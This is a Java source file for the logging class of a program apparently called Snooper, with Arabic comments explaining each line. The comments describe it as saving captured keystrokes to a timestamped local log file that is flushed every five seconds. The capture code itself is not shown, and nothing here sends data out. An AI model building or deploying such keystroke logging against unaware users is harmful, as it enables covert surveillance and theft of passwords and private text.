package com.snooper;

import com.snooper.tray.*;
import com.snooper.*;

import java.io.*;

public class SnoopLogger implements Disposable {
	
	private File logFile;
	private BufferedWriter writer; // بواسطة فئةBufferedWriteer  يتم تخزين الاحرف مؤقتا داخليا اثناء القراءة او الكتابة
	
	private String separator;
	
	private javax.swing.Timer flushTimer; //تدفق الموقت  يتم ترصد الاتقاط في كل ملي ثانية
	private boolean logged; // المتغير الذي يأكد حالة التقاط الاحرف او لا
	
	public SnoopLogger(String logFilepath) { //عمل الكنستراكتور
		this.separator = "::"; //202105151132420186::Space

                                                    //  SECOND_IN_MILLI = 1_000;    // Lambda Expressions -> اسلوب لتقليل حجم الكود هنا ممررنا للداله اكثر من قيمة واكثر من امر
		this.flushTimer = new javax.swing.Timer(Snooper.SECOND_IN_MILLI * 5, e-> {
			try {
				if (logged) {
					logged = false; //في حال كان لايتم التقاط وكتابة العنصر للسجل بسبب مشكله
					flush();// اذا حصل اي مشكله في العناصر الملتقطة سبتم حفظ الاستثناء في السجل
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		});
		load(logFilepath); //
		this.flushTimer.start();
	}
	
         // هنا عمل الداله قراءه العناصر التي في ملف السجل حسب المعلومات التي سيتم جلبها بواسطة كائنات الكلاس نفسه 
	private void load(String logFilepath) {// عمل الداله انشاء ملف سجل جديد بدل المؤقت وكتاب الاحرف المخزنة داخله
		this.logFile = Util.createFile(logFilepath);
		try {
			writer = new BufferedWriter(new FileWriter(logFile));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public BufferedWriter getWriter() { // جلب العناصر المخزنة في الذاكرة
		return writer;
	}
	
	public void setSeparator(String separator) {
		this.separator = separator;
	}
	
	public File getLogFile() { //جلب معلومات الملف
		return logFile;
	}
	
	private void logged() { // الحاله الافتراضية انه يتم التقاط ضربات لوحة المفاتيح
		logged = true;
	}
	
	public void snoopLog(String s) { // دالة حفظ الضغطات المخزنة في السجل الذي في المسار الذي تم تهيئة عند بدء البرنامج
		try {
                            //getCurrentDate الحصول على التاريخ 
                                          //  ex          202105151132420186       ::          char
			writer.write(Util.getCurrentDate(Snooper.fileNameFormat) + separator + s);
			writer.newLine();// داله تابعة لكلاس BufferedWriter  تقوم بانزال صطر جديد
			
                        logged(); // ترحع صح اذا تم حفظ الضغطات المخزنة في السجل
                        
                        
		} catch (Exception ex) { // استثناء خطأ منطقي يحدث أثناء تشغيل البرنامج.
			ex.printStackTrace();
		}
	}
	
	//extra اضافي
	public void logln(String s) {
		try {
			writer.write(s);
			writer.newLine();
			logged();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void log(String s) {
		try {
			writer.write(s);
			logged();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void flush() {// اذا حصل اي مشكله في العناصر الملتقطة سبتم حفظ الاستثناء في السجل
		try {
                    //fllush() >> public void flush() throws IOException >> BufferedWriter
			writer.flush();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void clear() { // مسح كل البيانات التي في ملف السجل الحالي
		try {
			Util.notif(Snooper.TITLE, "Overwriting temp log...");
			writer.close();
			load(logFile.getPath());
		} catch (Exception ex) {
			Util.notif(Snooper.TITLE, "Error clearing current log...");
		}
	}
	
	@Override
	public void dispose() { 
        // تعمل هذه الداله لتوقف الالتقاط اذا لم يكون هناك حروف مخزنة
		System.out.println("SnoopLogger.java Disposing...");
		if (writer == null) return;
		try {
			writer.close();
		} catch (Exception ex) {
			Util.notif(Snooper.TITLE, "Error closing writer...");
		}
	}
	
	public void renameFile(File file) { //
		if (Util.hasInstance(file)) {
 // ثم بنقل العناصر الى سجل جديد ويغيير اسمه حسب التنسيق ويحذف سجل التيمب  tempFile  // يتحقق مما إذا كان الملف قد تم إنشاؤه بالفعل
			file.delete(); 
		}
		
                //public boolean renameTo(File file) { >> class File
		logFile.renameTo(file);
	}
	
	public void renameFile(String filepath) {//تغيير اسم السجل الجديد
		renameFile(new File(filepath));
	}
}